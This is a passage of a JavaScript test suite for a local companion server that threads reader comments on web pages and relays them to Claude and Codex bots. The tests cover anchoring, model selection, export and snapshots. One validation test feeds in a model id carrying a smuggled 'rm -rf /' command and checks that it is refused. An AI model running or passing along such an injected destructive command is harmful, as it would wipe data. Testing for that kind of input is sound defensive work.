    assert.equal(p.threads[0].addressed_at, undefined);
    assert.equal(p.threads[0].addressed_by, undefined, 'no addressed fields left behind: state, not history');
  });

  await test('POST /addressed is the reader\'s "not done", and only clears', async () => {
    const id = (await GET(base, `/page?url=${encodeURIComponent(READY_URL)}`)).json.threads[0].id;
    // put it back into the state by hand — the symmetric direction exists so a
    // second reader can hand a thread over without replying into it
    const on = await POST(base, '/addressed', { url: READY_URL, thread_id: id, addressed: true });
    assert.equal(on.status, 200);
    assert.equal(on.json.thread.addressed, true);

    const off = await POST(base, '/addressed', { url: READY_URL, thread_id: id, addressed: false });
    assert.equal(off.status, 200);
    assert.equal(off.json.thread.addressed, undefined);
    const p = (await GET(base, `/page?url=${encodeURIComponent(READY_URL)}`)).json;
    assert.equal(p.threads[0].addressed, undefined, 'it survives the round trip');
    assert.equal(p.threads[0].resolved, undefined, '…and nothing was filed on the reader\'s behalf');

    // a form has no booleans, and the reading room's button posts one
    const bare = await POST(base, '/addressed', { url: READY_URL, thread_id: id });
    assert.equal(bare.status, 200);
    assert.equal(bare.json.thread.addressed, undefined, 'an absent flag means "not done"');
    assert.equal((await POST(base, '/addressed', { url: READY_URL, thread_id: 'no-such' })).status, 404);
  });

  await test('filing a ready thread spends the claim, and reopening does not restore it', async () => {
    const id = (await GET(base, `/page?url=${encodeURIComponent(READY_URL)}`)).json.threads[0].id;
    await POST(base, '/addressed', { url: READY_URL, thread_id: id, addressed: true });
    const filed = await POST(base, '/resolve', { url: READY_URL, thread_id: id, resolved: true });
    assert.equal(filed.json.thread.resolved, true);
    assert.equal(filed.json.thread.addressed, undefined, 'the reader looked; the claim has done its job');
    const back = await POST(base, '/resolve', { url: READY_URL, thread_id: id, resolved: false });
    assert.equal(back.json.thread.resolved, undefined);
    assert.equal(back.json.thread.addressed, undefined,
      '"not done" is what a reopen means — it must not land back in Ready for review');
    // …and let the filing turn that /resolve queued drain before anything else
    // snapshots the bridge's inputs: a straggler would land in someone's slice
    await waitFor(() => inputs(logFile).some(t => /file a resolved comment thread/.test(t)
      && /2026\/ready/.test(t)), 'the filing turn to drain');
  });

  // --- the passage moved, and the page found it again ---------------------
  // A bot's change rewrites the quoted passage: the highlight orphans and the
  // reader loses all bearing on where the change landed. The bot has said what
  // it now reads; the EXTENSION locates that on the live page (this companion
  // has no DOM and must never rewrite an anchor on a claim alone) and posts
  // the proven anchor here, where it is made durable for the next visit, the
  // phone, and every other tab.
  const MOVED_URL = 'https://ledger.test/2026/moved';
  await test('POST /reanchor moves a ready thread onto the wording a bot quoted back', async () => {
    await POST(base, '/page', { url: MOVED_URL, title: 'Moved', site: 'ledger.test' });
    const WAS = 'the walk back to the tram stop was quieter than it has been in years';
    const NOW = 'the walk back to the tram stop was quiet, and unhurried';
    const t = (await POST(base, '/thread', {
      url: MOVED_URL, quote: WAS, prefix: 'the season with a draw.', suffix: '— not angry',
      msg: { text: 'tighten this?' },
    })).json.thread;

    // not yet: nobody has answered here, and nobody has claimed a new wording
    assert.equal((await POST(base, '/reanchor',
      { url: MOVED_URL, thread_id: t.id, quote: NOW })).status, 409);

    // the bot's answer, exactly as one arrives — the reply path that already
    // marks the thread addressed is the same one that carries the claim
    await POST(base, '/reply', {
      url: MOVED_URL, thread_id: t.id,
      text: '@claude tighten this. [mock:reads:' + NOW + ']',
    });
    const ready = await waitFor(async () => {
      const p = (await GET(base, `/page?url=${encodeURIComponent(MOVED_URL)}`)).json;
      return p.threads[0].addressed ? p : null;
    }, 'the thread to go ready');
    assert.equal(ready.threads[0].quote, WAS, 'the anchor is still the old wording until a page proves otherwise');

    const r = await POST(base, '/reanchor', {
      url: MOVED_URL, thread_id: t.id, quote: NOW,
      prefix: 'the season with a draw.', suffix: '. Nobody sang',
    });
    assert.equal(r.status, 200);
    assert.equal(r.json.changed, true);
    const p = (await GET(base, `/page?url=${encodeURIComponent(MOVED_URL)}`)).json;
    assert.equal(p.threads[0].quote, NOW, 'the anchor is the new wording, durably');
    assert.equal(p.threads[0].prior_quote, WAS, 'and the original is kept — it is the "was" half of the diff');
    assert.equal(p.threads[0].orphaned, false, 'the anchor was just found, so the record stops saying it is lost');
    assert.ok(p.threads[0].reanchored_at, 'stamped');

    const again = await POST(base, '/reanchor', { url: MOVED_URL, thread_id: t.id, quote: NOW });
    assert.equal(again.json.changed, false, 'a second tab locating the same passage is not a second rewrite');

    // the one thing the companion IS the authority on: which wording may be
    // written. A client cannot use this door to set a quote to anything it likes.
    const forged = await POST(base, '/reanchor',
      { url: MOVED_URL, thread_id: t.id, quote: 'whatever the client felt like' });
    assert.equal(forged.status, 409);
    assert.equal((await GET(base, `/page?url=${encodeURIComponent(MOVED_URL)}`)).json.threads[0].quote, NOW);
    assert.equal((await POST(base, '/reanchor', { url: MOVED_URL, thread_id: 'no-such', quote: NOW })).status, 404);
  });

  await test('/resolve refuses a thread that is not there, and /summarize queues on demand', async () => {
    const gone = await POST(base, '/resolve', { url: REOPEN_URL, thread_id: 'no-such-thread', resolved: true });
    assert.equal(gone.status, 404);
    const id = (await GET(base, `/page?url=${encodeURIComponent(REOPEN_URL)}`)).json.threads[0].id;
    const sentBefore = inputs(logFile).filter(t => /file a resolved comment thread/.test(t)).length;
    const again = await POST(base, '/summarize', { url: REOPEN_URL, thread_id: id });
    assert.equal(again.status, 200);
    await waitFor(() => inputs(logFile).filter(t => /file a resolved comment thread/.test(t)).length > sentBefore,
      'a second summary turn');
  });

  await test('POST /edit rewrites your own message and refuses the bots\'', async () => {
    const page = (await GET(base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
    const mine = page.threads[0].msgs[1];
    const bot = page.threads[0].msgs[3];
    const okEdit = await POST(base, '/edit', { url: PAGE1, thread_id: t1.id, ts: mine.ts, text: 'Second thought, revised.' });
    assert.equal(okEdit.json.msg.text, 'Second thought, revised.');
    const denied = await POST(base, '/edit', { url: PAGE1, thread_id: t1.id, ts: bot.ts, text: 'nope' });
    assert.equal(denied.status, 403);
  });

  // --- model selection --------------------------------------------------
  await test('GET /models reports what the running bridge announced', async () => {
    const r = await GET(base, '/models');
    assert.equal(r.json.bridge, 'running');
    assert.deepEqual(r.json.current, { claude: 'claude-fable-5', codex: 'gpt-5.6-sol' });
    assert.ok(r.json.options.claude.includes('claude-opus-5'));
    assert.ok(r.json.options.codex.includes('gpt-5.5'));
    assert.deepEqual(r.json.status.claude, {
      pct: 4, tokens: r.json.status.claude.tokens, window: 1000000,
      model: 'claude-fable-5', last_relay_at: null, last_relay_tier: null,
    });
    assert.ok(r.json.status.claude.tokens >= 42000, 'occupancy passes through');
    assert.equal(r.json.status.codex.window, 1050000);
    assert.equal(r.json.status.auto_relay, true);
    // effort options come from the same completion_context the models do
    assert.deepEqual(r.json.effort.current, { claude: 'high', codex: null });
    assert.deepEqual(r.json.effort.options.claude, ['low', 'medium', 'high', 'xhigh']);
    assert.ok(r.json.effort.options.codex.includes('minimal'));
    assert.equal(r.json.verbosity, 'short');
  });

  await test('the bridge status event broadcast a models event', () => {
    const ev = stream.events.filter(e => e.type === 'models').pop();
    assert.ok(ev, 'a models event');
    assert.equal(ev.current.claude, 'claude-fable-5');
    assert.equal(ev.status.claude.pct, 4);
    assert.equal(ev.status.auto_relay, true);
  });

  await test('a model chosen while the bridge is live is relayed at once — and still stored', async () => {
    const before = stream.events.length;
    const sentBefore = inputs(logFile).length;
    const r = await POST(base, '/model', { agent: 'claude', model: 'claude-opus-5' });
    // `applies:'now'` is the whole difference from the sleeping case below
    assert.deepEqual(r.json, { ok: true, queued: true, applies: 'now' });
    await waitFor(() => inputs(logFile).length > sentBefore, 'control turn at the bridge');
    assert.deepEqual(inputs(logFile).slice(sentBefore), ['/model @claude claude-opus-5']);
    const ev = await waitFor(() => stream.events.slice(before).find(e => e.type === 'models'), 'models event');
    assert.deepEqual(ev.current, { claude: 'claude-opus-5', codex: 'gpt-5.6-sol' });
    // a control turn is not a page turn: no thread ever hears about it
    assert.equal(stream.events.slice(before).filter(e => e.type === 'chat').length, 0);
    const models = (await GET(base, '/models')).json;
    assert.equal(models.current.claude, 'claude-opus-5');
    // relaying it is not instead of remembering it: the next bridge gets it too
    const cfg = JSON.parse(fs.readFileSync(
      path.join(root, '.botference', 'plugin', 'config.json'), 'utf8'));
    assert.equal(cfg.agents.model.claude, 'claude-opus-5', 'the preference is on disk');
    assert.deepEqual(cfg.agents.model_options.claude,
      ['claude-fable-5', 'claude-opus-5', 'claude-haiku-4-5'],
      'and so are the lists the bridge advertised, for the pickers to use while it sleeps');
  });

  await test('token creep is not broadcast; a pct change is', async () => {
    const quiet = stream.events.length;
    await POST(base, '/reply', { url: PAGE1, thread_id: '__page__', text: '@claude quick one' });
    await waitFor(() => stream.events.slice(quiet).some(e => e.kind === 'turn-end'), 'turn-end');
    assert.equal(stream.events.slice(quiet).filter(e => e.type === 'models').length, 0,
      'a heartbeat status that only moved tokens is not news');
    const before = stream.events.length;
    await POST(base, '/reply', { url: PAGE1, thread_id: '__page__', text: '@claude another [mock:pct]' });
    await waitFor(() => stream.events.slice(before).some(e => e.kind === 'turn-end'), 'turn-end');
    const ev = stream.events.slice(before).find(e => e.type === 'models');
    assert.ok(ev, 'an occupancy change reaches every tab');
    assert.equal(ev.status.claude.pct, 9);
    assert.equal(ev.status.codex.pct, 7);
    assert.ok(ev.status.claude.tokens > 42000, 'the payload still carries live tokens');
  });

  await test('POST /relay hands the control turn to the bridge verbatim', async () => {
    const before = stream.events.length;
    const sentBefore = inputs(logFile).length;
    const r = await POST(base, '/relay', { agent: 'both' });
    assert.deepEqual(r.json, { ok: true, queued: true });
    await waitFor(() => inputs(logFile).length > sentBefore, 'relay at the bridge');
    assert.deepEqual(inputs(logFile).slice(sentBefore), ['/relay @both']);
    assert.equal(stream.events.slice(before).filter(e => e.type === 'chat').length, 0,
      'a control turn is not a page turn');
    for (const agent of ['claude', 'codex']) {
      const n = inputs(logFile).length;
      assert.equal((await POST(base, '/relay', { agent })).json.ok, true);
      await waitFor(() => inputs(logFile).length > n, `relay @${agent}`);
      assert.deepEqual(inputs(logFile).slice(n), [`/relay @${agent}`]);
    }
    const bad = await POST(base, '/relay', { agent: 'everyone' });
    assert.equal(bad.status, 400);
    assert.equal(bad.json.ok, false);
  });

  await test('POST /model refuses a bad agent, a bad id, and an unlisted model', async () => {
    const bad = [
      { agent: 'gemini', model: 'claude-opus-5' },
      { agent: 'claude', model: 'claude opus 5; rm -rf /' },
      { agent: 'claude', model: 'gpt-5.5' },
    ];
    for (const body of bad) {
      const r = await POST(base, '/model', body);
      assert.equal(r.status, 400, JSON.stringify(body));
      assert.equal(r.json.ok, false);
    }
  });

  await test('POST /delete removes a message, then the thread', async () => {
    const page = (await GET(base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
    const ts = page.threads[0].msgs[1].ts;
    await POST(base, '/delete', { url: PAGE1, thread_id: t1.id, ts });
    let after = (await GET(base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
    assert.equal(after.threads[0].msgs.length, 3);
    await POST(base, '/delete', { url: PAGE1, thread_id: t1.id });
    after = (await GET(base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
    assert.equal(after.threads.length, 0);
    const idx = (await GET(base, '/index')).json;
    assert.equal(idx[crypto.createHash('sha1').update(PAGE1).digest('hex')].threads, 0);
  });

  await test('deleting a thread\'s last message deletes the thread', async () => {
    const url = 'https://ledger.test/2026/solo-comment';
    await POST(base, '/page', { url, title: 'Solo Comment', site: 'ledger.test' });
    const t = (await POST(base, '/thread', {
      url, quote: 'one quote', prefix: '', suffix: '', msg: { text: 'only comment' },
    })).json.thread;
    const r = await POST(base, '/delete', { url, thread_id: t.id, ts: t.msgs[0].ts });
    assert.equal(r.json.ok, true);
    assert.equal(r.json.thread_deleted, true, 'the caller learns the highlight is gone');
    const page = (await GET(base, `/page?url=${encodeURIComponent(url)}`)).json;
    assert.deepEqual(page.threads, [], 'no empty thread left behind');
    const key = crypto.createHash('sha1').update(url).digest('hex');
    const idx = (await GET(base, '/index')).json;
    assert.equal(idx[key].threads, 0, 'index count follows');
    const onDisk = JSON.parse(fs.readFileSync(path.join(root, '.botference', 'plugin', 'pages', `${key}.json`), 'utf8'));
    assert.deepEqual(onDisk.threads, []);
  });

  await test('reading a page prunes empty threads left by older builds', async () => {
    process.env.BOTFERENCE_PROJECT_ROOT = root;
    const store = await import('../store.mjs');
    const url = 'https://ledger.test/2026/legacy-damage';
    const page = store.blankPage({ url, title: 'Legacy Damage', site: 'ledger.test' });
    page.threads = [
      { id: 't-1-aaaa', quote: 'gone', prefix: '', suffix: '', orphaned: false, msgs: [] },
      { id: 't-2-bbbb', quote: 'kept', prefix: '', suffix: '', orphaned: false,
        msgs: [{ author: 'angadh', ts: new Date().toISOString(), text: 'still here' }] },
    ];
    store.savePage(page);
    const key = crypto.createHash('sha1').update(url).digest('hex');
    assert.equal((await GET(base, '/index')).json[key].threads, 2, 'damaged record starts with two');
    const served = (await GET(base, `/page?url=${encodeURIComponent(url)}`)).json;
    assert.deepEqual(served.threads.map(t => t.id), ['t-2-bbbb'], 'served record is healed');
    const onDisk = JSON.parse(fs.readFileSync(path.join(root, '.botference', 'plugin', 'pages', `${key}.json`), 'utf8'));
    assert.deepEqual(onDisk.threads.map(t => t.id), ['t-2-bbbb'], 'and so is the file');
    assert.equal((await GET(base, '/index')).json[key].threads, 1, 'and the index');
  });

  await test('tool-activity room entries are kept but flagged kind:"tools"', async () => {
    const url = 'https://ledger.test/2026/tool-activity';
    const vaultFile = path.join(vault, 'Web Clippings', 'Tool Activity.md');
    await POST(base, '/page', { url, title: 'Tool Activity', site: 'ledger.test' });
    const before = stream.events.length;
    const t = (await POST(base, '/thread', {
      url, quote: 'a claim worth checking', prefix: '', suffix: '',
      msg: { text: '@claude verify this [mock:tools]' },
    })).json.thread;
    await waitFor(() => stream.events.slice(before).some(e => e.kind === 'turn-end'), 'turn-end');
    const replies = stream.events.slice(before).filter(e => e.kind === 'reply');
    assert.equal(replies.length, 3, 'two tool summaries and the answer');
    assert.equal(replies[0].msg.kind, 'tools', 'flagged by the :tools stream id');
    assert.equal(replies[1].msg.kind, 'tools', 'flagged by shape when unstreamed');
    assert.equal(replies[2].msg.kind, undefined, 'the answer stays unmarked');
    const page = (await GET(base, `/page?url=${encodeURIComponent(url)}`)).json;
    const msgs = page.threads[0].msgs;
    assert.deepEqual(msgs.map(m => m.kind), [undefined, 'tools', 'tools', undefined]);
    assert.ok(msgs[1].text.startsWith('Explored'), 'the tool text is kept, not dropped');
    assert.equal(msgs[3].text, 'MOCK claude reply.');

    const r = await POST(base, '/export', { url });
    assert.equal(r.json.path, vaultFile);
    const note = fs.readFileSync(vaultFile, 'utf8');
    assert.ok(!note.includes('Explored'), 'the note omits tool activity');
    assert.ok(note.includes('**claude:** MOCK claude reply.'), 'but keeps the answer');
    assert.ok(note.includes('**angadh:** @claude verify this [mock:tools]'));
    assert.equal(t.msgs.length, 1);
  });

  // --- export -----------------------------------------------------------
  // the "everything" note, kept so the comments-only test can prove that
  // asking for everything again puts back exactly what was there before
  let expectedAll = '';
  await test('POST /export writes the Obsidian note byte-for-byte', async () => {
    const url = 'https://example.test/export-fixture';
    await POST(base, '/page', { url, title: 'Export Fixture', site: 'example.test' });
    await POST(base, '/thread', {
      url, quote: 'Quote one goes here.', prefix: 'a ', suffix: ' b',
      msg: { text: 'A neat point.' },
    });
    const second = await POST(base, '/thread', {
      url, quote: 'Quote two — with an em dash.', prefix: 'c ', suffix: ' d',
      msg: { text: '@claude is this right?' },
    });
    await waitFor(() => fs.existsSync(path.join(root, '.botference', 'plugin', 'pages',
      `${crypto.createHash('sha1').update(url).digest('hex')}.json`)), 'page file');
    const seen = () => (JSON.parse(fs.readFileSync(path.join(root, '.botference', 'plugin', 'pages',
      `${crypto.createHash('sha1').update(url).digest('hex')}.json`), 'utf8')));
    await waitFor(() => seen().threads[1].msgs.length === 2, 'bot reply on thread two');
    await POST(base, '/reply', { url, thread_id: '__page__', text: '@claude what is this about?' });
    await waitFor(() => seen().page_chat.length === 2, 'bot reply in the page chat');
    assert.equal(second.json.thread.msgs[0].text, '@claude is this right?');

    const r = await POST(base, '/export', { url });
    assert.equal(r.json.ok, true);
    const expected = [
      '---',
      `url: ${url}`,
      'site: example.test',
      `saved: ${new Date().toISOString().slice(0, 10)}`,
      'tags: [botference-discuss]',
      '---',
      '',
      '# Export Fixture',
      '',
      '> Quote one goes here.',
      '',
      'A neat point.',
      '',
      '> Quote two — with an em dash.',
      '',
      '**angadh:** @claude is this right?',
      '**claude:** MOCK claude reply.',
      '',
      '## Page chat',
      '',
      '**angadh:** @claude what is this about?',
      '**claude:** MOCK claude reply.',
      '',
    ].join('\n');
    assert.equal(r.json.path, path.join(vault, 'Web Clippings', 'Export Fixture.md'));
    assert.equal(fs.readFileSync(r.json.path, 'utf8'), expected);
    assert.equal(r.json.mode, 'all', 'no mode asked for is the export as it always was');
    expectedAll = expected;
  });

  await test('POST /export {mode:"comments"} writes the reading without the conversation', async () => {
    const url = 'https://example.test/export-fixture';
    const r = await POST(base, '/export', { url, mode: 'comments' });
    assert.equal(r.json.ok, true);
    assert.equal(r.json.mode, 'comments');
    // the same note, replaced in place: one note per page, whichever mode
    // wrote it last
    assert.equal(r.json.path, path.join(vault, 'Web Clippings', 'Export Fixture.md'));
    const note = fs.readFileSync(r.json.path, 'utf8');
    assert.equal(note, [
      '---',
      `url: ${url}`,
      'site: example.test',
      `saved: ${new Date().toISOString().slice(0, 10)}`,
      'tags: [botference-discuss]',
      '---',
      '',
      '# Export Fixture',
      '',
      '> Quote one goes here.',
      '',
      'A neat point.',
      '',
      '> Quote two — with an em dash.',
      '',
    ].join('\n'));
    assert.ok(!note.includes('MOCK claude reply.'), 'no bot answers');
    assert.ok(!note.includes('@claude is this right?'), 'no questions put to a bot');
    assert.ok(!note.includes('## Page chat'), 'and no page chat at all');
    assert.ok(note.includes('> Quote two — with an em dash.'),
      'but the highlight survives a thread whose messages all filtered away');
    // …and asking again for everything puts it all back
    const back = await POST(base, '/export', { url, mode: 'all' });
    assert.equal(back.json.mode, 'all');
    assert.equal(fs.readFileSync(back.json.path, 'utf8'), expectedAll);
    // an unrecognised mode is not an error: it is everything, as before
    const odd = await POST(base, '/export', { url, mode: 'whatever' });
    assert.equal(odd.json.mode, 'all');
  });

  await test('re-export overwrites in place; a different url gets " (2)"', async () => {
    const url = 'https://example.test/export-fixture';
    const again = await POST(base, '/export', { url });
    assert.equal(again.json.path, path.join(vault, 'Web Clippings', 'Export Fixture.md'));
    const other = 'https://other.test/same-headline';
    await POST(base, '/page', { url: other, title: 'Export Fixture', site: 'other.test' });
    const r = await POST(base, '/export', { url: other });
    assert.equal(r.json.path, path.join(vault, 'Web Clippings', 'Export Fixture (2).md'));
    assert.deepEqual(fs.readdirSync(path.join(vault, 'Web Clippings')).filter(f => f.startsWith('Export Fixture')).sort(),
      ['Export Fixture (2).md', 'Export Fixture.md']);
  });

  // --- page text that moves under the reader -----------------------------
  await test('a later turn re-sends the page text only when the extension says it changed', async () => {
    const url = 'https://ledger.test/2026/living-draft';
    await POST(base, '/page', { url, title: 'Living Draft', site: 'ledger.test' });
    // the envelope of the next turn to reach the bridge, whatever control
    // steps precede it
    const nextTurn = async from => waitFor(
      () => inputs(logFile).slice(from).find(t => t.startsWith('@claude ')), 'the user turn');

    // first turn: article_changed is set, but a brand-new chat gets the
    // ordinary page-context block — there is no "earlier" to differ from
    let from = inputs(logFile).length;
    await POST(base, '/thread', {
      url, quote: 'the draft as it stood', prefix: '', suffix: '',
      msg: { text: '@claude first look' }, article_text: ARTICLE, article_changed: true,
    });
    const first = await nextTurn(from);
    assert.ok(first.includes(`[web page: "Living Draft" · ${url}]`), 'first-turn context');
    assert.ok(first.includes(ARTICLE));
    assert.ok(!first.includes('has been updated'), 'no refresh banner on turn one');
    await waitFor(async () => (await GET(base, `/page?url=${encodeURIComponent(url)}`)).json.session_id,
      'sid capture on the living draft');

    // later turn, text moved: the refreshed article rides again, flagged
    from = inputs(logFile).length;
    await POST(base, '/reply', {
      url, thread_id: '__page__', text: '@claude and now?',
      article_text: ARTICLE2, article_changed: true,
    });
    const later = await nextTurn(from);
    assert.ok(later.startsWith('@claude [the page content has been updated since earlier in this chat]\n'),
      'the refresh banner leads the envelope');
    assert.ok(later.includes(ARTICLE2), 'with the new text');
    assert.ok(!later.includes(`[web page: "Living Draft"`), 'and not the first-turn header');

    // later turn, text unchanged: no context at all, however much the
    // extension sent along
    from = inputs(logFile).length;
    await POST(base, '/reply', {
      url, thread_id: '__page__', text: '@claude quietly', article_text: ARTICLE2,
    });
    const quiet = await nextTurn(from);
    assert.ok(!quiet.includes('has been updated'), 'unflagged text is not resent');
    assert.ok(!quiet.includes(ARTICLE2));
    const page = (await GET(base, `/page?url=${encodeURIComponent(url)}`)).json;
    assert.ok(!JSON.stringify(page).includes('REWRITTEN'), 'page text is never persisted');
  });

  // --- the snapshot names the whole document ------------------------------
  // The inline slice is orientation, not the document: where a page's snapshot
  // is on disk, the envelope names its ABSOLUTE path and the bot reads the
  // file — the library's route, which works because reads are pre-allowed and
  // the companion's deny-all permission gate only ever sees writes. On a
  // 15-page PDF the inline slice is pages 1-2; the file is the whole paper.
  await test('a snapshot-backed page names the snapshot file, caps the slice, and says the page', async () => {
    const url = 'https://arxiv.test/abs/2608.01234';
    await POST(base, '/page', { url, title: 'Fifteen Pages of Proof', site: 'arxiv.test' });
    // a PDF-shaped snapshot: one <section> per page, as the viewer posts them
    const sections = Array.from({ length: 15 }, (_, i) =>
      `<section><h2>Page ${i + 1}</h2><p>page ${i + 1} body: ${'lemma '.repeat(40)}</p></section>`).join('');
    const snap = await POST(base, '/snapshot', { url, html: sections });
    assert.equal(snap.json.stored, true);
    const key = crypto.createHash('sha1').update(url).digest('hex');
    const snapFile = path.join(root, '.botference', 'plugin', 'snapshots', `${key}.html`);
    assert.ok(fs.existsSync(snapFile), 'the snapshot really is on disk');

    // ~4000 chars of page-marked text: under the old 6000 cap, over the 2500
    // the envelope keeps once the file carries the rest
    const longText = Array.from({ length: 15 }, (_, i) =>
      `[page ${i + 1}] page ${i + 1} body: ${'lemma '.repeat(40)}`).join('\n');
    const from = inputs(logFile).length;
    const r = await POST(base, '/thread', {
      url, quote: 'page 14 body', prefix: '', suffix: '', page: 14,
      msg: { text: '@claude is the induction on page 14 sound?' }, article_text: longText,
    });
    assert.equal(r.json.queued, true);
    const turn = await waitFor(() => inputs(logFile).slice(from).find(t => t.startsWith('@claude ')), 'the turn');
    assert.ok(turn.includes(`The full text of this page is on this machine, at ${snapFile}`),
      'the snapshot is named by absolute path');
    assert.ok(turn.includes('one <section> per page, each headed "Page N"'),
      'and the file\'s shape is described');
    assert.ok(turn.includes('[page 1]'), 'the inline slice still opens the document');
    assert.ok(!turn.includes('[page 15]'), 'but it is a slice — the FILE is the document');
    assert.ok(turn.includes('This comment is on page 14 of the document.'),
      'the turn says which page the comment sits on');
    assert.ok(turn.includes(`[web page: "Fifteen Pages of Proof" · ${url}]`),
      'the first-turn header is unchanged');
  });

  await test('the snapshot path rides every turn, not just the first', async () => {
    const url = 'https://arxiv.test/abs/2608.01234';
    const key = crypto.createHash('sha1').update(url).digest('hex');
    const snapFile = path.join(root, '.botference', 'plugin', 'snapshots', `${key}.html`);
    // wait out the sid capture so the next turn is a /resume, i.e. not first
    await waitFor(async () => (await GET(base, `/page?url=${encodeURIComponent(url)}`)).json.session_id,
      'sid capture on the snapshot page');
    const from = inputs(logFile).length;
    await POST(base, '/reply', { url, thread_id: '__page__', text: '@claude and the conclusion?' });
    const later = await waitFor(() => inputs(logFile).slice(from).find(t => t.startsWith('@claude ')), 'the later turn');
    assert.ok(later.includes(snapFile),
      'the path is repeated — a turn is all a resumed session is guaranteed to carry');
    assert.ok(!later.includes('[web page:'), 'without re-sending the first-turn context');
    assert.ok(!later.includes('This comment is on page'), 'page chat sits on no page');
  });

  await test('no snapshot on disk: the inline envelope, uncut, and never an error', async () => {
    const url = 'https://ledger.test/2026/no-snapshot';
    await POST(base, '/page', { url, title: 'No Snapshot', site: 'ledger.test' });
    // over the snapshot slice (2500), under ARTICLE_MAX (6000): all of it rides
    const inline = `${ARTICLE} ${'margin note. '.repeat(300)}THE-VERY-END`;
    assert.ok(inline.length > 2500 && inline.length < 6000, 'the fixture sits between the two caps');
    const from = inputs(logFile).length;
    const r = await POST(base, '/thread', {
      url, quote: 'plain passage', prefix: '', suffix: '', page: 3,
      msg: { text: '@claude a plain question' }, article_text: inline,
    });
    assert.equal(r.json.queued, true);
    const turn = await waitFor(() => inputs(logFile).slice(from).find(t => t.startsWith('@claude ')), 'the turn');
    assert.ok(turn.includes('THE-VERY-END'), 'the whole inline text rides, to the old cap');
    assert.ok(!turn.includes('full text of this page is on this machine'), 'no snapshot, no path line');
    assert.ok(turn.includes('This comment is on page 3 of the document.'),
      'the locality line needs no snapshot — the thread knows its page');
  });

  // A struck passage is a suggested deletion the reader drew on the document,
  // and the turn has to carry it BOTH ways: the bot is told, and the bot is
  // told not to act. Half of this — the telling — is the easy half; the other
  // half is why the wording is asserted rather than merely its presence.
  await test('a struck passage rides the envelope as context, with the hands-off instruction', async () => {
    const url = 'https://arxiv.test/abs/2608.09999';
    await POST(base, '/page', { url, title: 'Struck Proof', site: 'arxiv.test', kind: 'pdf' });
    const from = inputs(logFile).length;
    const r = await POST(base, '/thread', {
      url, quote: 'the induction is trivial', prefix: '', suffix: '', page: 7, mark: 'strike',
      msg: { text: '@claude why did I want this gone?' },
    });
    assert.equal(r.json.queued, true);
    const turn = await waitFor(() => inputs(logFile).slice(from).find(t => t.startsWith('@claude ')), 'the turn');
    assert.ok(/has STRUCK this passage through/.test(turn), 'the turn says the passage is struck');
    assert.ok(/suggested deletion/.test(turn), '…and what a strike means');
    assert.ok(/background, not an instruction/.test(turn), '…and that it is context, not a request');
    assert.ok(/do not carry out, argue for, or offer to make the deletion unless they ask/.test(turn),
      '…in the words that stop a helpful model from doing it anyway');
    assert.ok(turn.includes('This comment is on page 7 of the document.'),
      'the page line it rides beside is untouched');
  });

  await test('an ordinary highlight says nothing about strikes', async () => {
    const url = 'https://arxiv.test/abs/2608.09998';
    await POST(base, '/page', { url, title: 'Plain Proof', site: 'arxiv.test', kind: 'pdf' });
    const from = inputs(logFile).length;
    await POST(base, '/thread', {
      url, quote: 'the induction is trivial', prefix: '', suffix: '', page: 7,
      msg: { text: '@claude is this sound?' },
    });
    const turn = await waitFor(() => inputs(logFile).slice(from).find(t => t.startsWith('@claude ')), 'the turn');
    assert.ok(!/STRUCK/.test(turn), 'no strike, no line — the envelope is the one it always was');
  });

  // --- lazy persistence meets the envelope --------------------------------
  // Under "No record until the reader acts" the extension holds every write
  // until the first act, then lands them in one fixed order — record,
  // snapshot, message — so the turn that first act summons is planned against
  // a page whose full text is already on disk. This is that wire sequence,
  // replayed, ending in the assertion the ordering exists FOR.
  await test('the first-ever message: record and snapshot land first, and the turn reads the file', async () => {
    const url = 'https://ledger.test/2026/first-act';
    const k = crypto.createHash('sha1').update(url).digest('hex');
    assert.ok(!fs.existsSync(path.join(root, '.botference', 'plugin', 'pages', `${k}.json`)),
      'no record exists before the act');
    await POST(base, '/page', { url, title: 'First Act', site: 'ledger.test' });
    const snap = await POST(base, '/snapshot', { url, html: '<p>the whole reading, kept for the bots</p>' });
    assert.equal(snap.json.stored, true, 'the snapshot lands before the message');
    const from = inputs(logFile).length;
    const r = await POST(base, '/thread', {
      url, quote: 'the whole reading', prefix: '', suffix: '',
      msg: { text: '@claude the first-ever message on this page' },
    });
    assert.equal(r.json.queued, true);
    const turn = await waitFor(() => inputs(logFile).slice(from).find(t => t.startsWith('@claude ')), 'the turn');
    const snapFile = path.join(root, '.botference', 'plugin', 'snapshots', `${k}.html`);
    assert.ok(turn.includes(snapFile),
      'the very first turn on the page already names the snapshot by absolute path');
  });

  // --- .docx comments ----------------------------------------------------
  await test('a .docx rides a mention and its comments reach the envelope', async () => {
    const url = 'https://docs.google.test/document/d/abc/edit';
    await POST(base, '/page', { url, title: 'Reviewed Doc', site: 'docs.google.test' });
    const from = inputs(logFile).length;
    const r = await POST(base, '/reply', {
      url, thread_id: '__page__', text: '@claude what are people objecting to?',
      docx_b64: docxB64(),
    });
    assert.equal(r.json.queued, true);
    const turn = await waitFor(() => inputs(logFile).slice(from).find(t => t.startsWith('@claude ')), 'the turn');
    assert.ok(turn.includes('\n[comments on this document]\n'), 'the digest is appended');
    assert.ok(turn.includes('Priya Raman: The load-factor claim needs a source.'),
      'runs inside one comment are joined');
    assert.ok(turn.includes('Tom & Co: Agreed & noted. Second paragraph of the same comment.'),
      'entities decoded, paragraphs flattened');
    assert.ok(!turn.includes('Empty:'), 'a comment with no words is dropped');
    assert.ok(!turn.includes('<w:'), 'no xml survives');
    const page = (await GET(base, `/page?url=${encodeURIComponent(url)}`)).json;
    assert.ok(!JSON.stringify(page).includes('Priya'), 'the document is never persisted');
  });

  await test('a corrupted .docx is ignored, not fatal', async () => {
    const url = 'https://docs.google.test/document/d/broken/edit';
    await POST(base, '/page', { url, title: 'Broken Doc', site: 'docs.google.test' });
    const from = inputs(logFile).length;
    const r = await POST(base, '/reply', {
      url, thread_id: '__page__', text: '@claude read this',
      docx_b64: Buffer.from('PK truncated upload, no directory here').toString('base64'),
    });
    assert.equal(r.json.queued, true, 'the comment is still sent');
    const turn = await waitFor(() => inputs(logFile).slice(from).find(t => t.startsWith('@claude ')), 'the turn');
    assert.ok(!turn.includes('[comments on this document]'), 'no digest, no crash');
  });

  await test('a .docx over 8MB is refused before anything is saved', async () => {
